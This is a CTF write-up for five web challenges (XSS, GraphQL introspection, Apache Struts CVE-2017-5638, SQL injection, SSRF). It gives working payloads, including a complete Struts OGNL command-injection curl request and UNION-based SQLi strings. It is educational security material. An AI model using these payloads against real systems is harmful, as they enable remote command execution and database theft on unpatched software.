---
layout: post
title: Ramadan's Spark CTF 2025 Web Writeups
subtitle: A comprehensive guide to solving web security challenges
gh-repo: L3benn/ctf-writeups
gh-badge: [star, fork, follow]
tags: [ctf, web-security, xss, graphql, sqli, ssrf, struts]
comments: true
mathjax: false
author: L3benn
---

{: .box-success}
This writeup covers 5 web security challenges from Ramadan's Spark CTF 2025, demonstrating various attack vectors including XSS, GraphQL introspection, Apache Struts RCE, SQL injection, and SSRF exploitation. Each challenge includes detailed step-by-step solutions with payload examples.

## Challenge 1: WhatIsXSS

{: .box-note}
**Challenge Type:** Cross-Site Scripting (XSS)

Upon opening the web application, we find a simple page explaining the XSS vulnerability and how it works.

### Analysis

Inspecting the source code, we discover a `script.js` file that contains the flag. However, the script is obfuscated, so we need to perform JavaScript deobfuscation.

Within the script, we encounter multiple fake flags, but the correct flag is stored inside a function called `revealFlagyabro()`.

### Exploitation

By executing a standard Stored XSS payload:

```html
<img src=x onerror=revealFlagyabro() >
```

We successfully capture the flag, which is base64-encoded.

{: .box-success}
**Flag:** `Spark{Y0u_N33d_t0_l34Rn_XSS!!!!!}`

---

## Challenge 2: Shadow Graph

{: .box-note}
**Challenge Type:** GraphQL Introspection & Information Disclosure

Upon opening the web application, we are presented with a login page. We try the credentials `guest:guest` and successfully log in.

Exploring the application, we discover a `/graphql` directory, indicating that the web app utilizes a GraphQL API.

### Step 1: Enumerate GraphQL Types

To enumerate all GraphQL types supported by the backend, we can use the following query:

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

{: .box-warning}
**Discovery:** We get a result containing basic default types, such as `Int` or `Boolean`, but also all custom types, such as `Project` & `Secret`.

### Step 2: Enumerate Fields

Now that we have identified a type, we can proceed to enumerate its fields using the following introspection query:

```graphql
{
  __type(name: "Secret") {
    name
    fields {
      name
    }
  }
}
```

The response reveals the details of the Secret user object, including its fields.

### Step 3: Enumerate Queries

Furthermore, we can enumerate all queries supported by the backend using the following introspection query:

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

### Step 4: Extract the Flag

Now that we have all the information we need, we can craft our payload to get the flag:

```graphql
{
  project(id: "3") {
    id
    name
    isSecret
    secrets {
      id
      name
      content
    }
  }
}
```

{: .box-success}
**Flag:** `Spark{F4st1ng_Is_G00d_But_Exp0sIng_Qu3r13s_Is_N0t}`

---

## Challenge 3: Struts Challenge 😈

{: .box-error}
**Challenge Type:** Apache Struts RCE (CVE-2017-5638)

This challenge is vulnerable to **CVE-2017-5638** - The Apache Struts vulnerability.

### Vulnerability Overview

Struts is vulnerable to remote command injection attacks through incorrectly parsing an attacker's invalid Content-Type HTTP header.

### Exploitation

For the payload using curl:

```bash
curl -X POST http://SERVER-IP:8080/product-catalog/ \
-H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

{: .box-warning}
**Testing:** This should give you as output `root`.

By changing the `#cmd` variable to `#cmd = 'cat /opt/flag.txt'`, you should get the flag.

{: .box-success}
**Flag:** `Spark{B0ou3radaFTW!!_23qd45sq6}`

---

## Challenge 4: Secure BankSys

{: .box-note}
**Challenge Type:** SQL Injection

By looking at the web app, we find there are three pages:
- Main page
- Accounts
- Login

In the accounts tab, we perform a simple SQL injection.

### Vulnerability Analysis

We know the webapp is vulnerable to SQLi. The vulnerability is in the `/search` route in `app.py`:

```python
sql_query = f"SELECT account_number, customer_name, balance, account_type FROM accounts WHERE account_number LIKE '%{query}%' OR customer_name LIKE '%{query}%' OR account_type LIKE '%{query}%'"
```

{: .box-warning}
**Critical Issue:** The user input is directly concatenated into the SQL query without parameterization, making it vulnerable to SQL injection.

### Exploitation Steps

**1. Explore database structure with UNION-based injection:**
```sql
' UNION SELECT 1,2,3,4 --
```
This helps us determine the number of columns (4) and their data types.

**2. Find table names:**
```sql
' UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table' --
```
This reveals the tables: `accounts`, `users`, `internal_data`, and `search_logs`.

**3. Find column names:**
```sql
' UNION SELECT 1,2,3,sql FROM sqlite_master WHERE tbl_name = 'internal_data' -- -
```

**4. Extract flag from internal_data table:**
```sql
' UNION SELECT 1, content, 3, 4 FROM internal_data --
```

{: .box-success}
**Flag:** `Spark{G00d_J0B_K1nG_Y0u_4R3_C00k1nGG_1ZSQMLK9LQSX21}`

---

## Challenge 5: Shadow Graph 2

{: .box-error}
**Challenge Type:** SSRF to GraphQL SQL Injection Exploitation

### Step 1: Identifying Key Information

While inspecting the source code, we find two important notes:

From `/index.html`:
```html
<!-- Oops!! Check internal/admin for testing -->
```

From `/dashboard`:
```html
<!-- Note for admins only: Use the fetch utility for internal testing on port 4000 -->
```

{: .box-warning}
**Key Insight:** These hints suggest that we need to access the internal admin panel via SSRF.

### Step 2: Exploiting SSRF to Gain Admin Access

To access the internal admin panel, we can exploit SSRF using the fetch utility:

```
https://shadow-two.espark.tn/fetch?url=http://localhost:4000/internal/admin
```

This allows us to escalate privileges and gain access as an admin.

### Step 3: Accessing GraphQL and Identifying Queries

Now that we have admin access, we navigate to the `/graphql` endpoint and explore the available queries:

| Query | Parameters |
|:------|:-----------|
| `getUser` | username: String |
| `getAllProducts` | None |
| `getProductById` | id: Int |

To test for SQL injection, we try the following query:

```graphql
{
  getUser(username: "admin' OR '1'='1") {
    id
    username
    role
  }
}
```

{: .box-note}
**Confirmation:** This confirms a SQL injection vulnerability in the `getUser` query.

### Step 4: Exploiting SQL Injection to Retrieve the Flag

Using SQL injection in the `getProductById` query, we attempt to extract sensitive data:

```graphql
{
  getProductById(id: "-1 UNION SELECT 3, secret_info, 'description', 0 FROM product_secrets WHERE product_id = 3") {
    id
    name
    description
    price
  }
}
```

By executing this payload, we retrieve secret information, which includes the flag.

{: .box-success}
**Flag:** `Spark{s0_M4ny_w4yss_t0_w1N!!!}`

---

## Summary

This CTF covered various web security vulnerabilities including:
- Cross-Site Scripting (XSS)
- GraphQL introspection and information disclosure
- Apache Struts RCE (CVE-2017-5638)
- SQL Injection
- Server-Side Request Forgery (SSRF)

Each challenge demonstrated different attack vectors and exploitation techniques commonly found in web applications.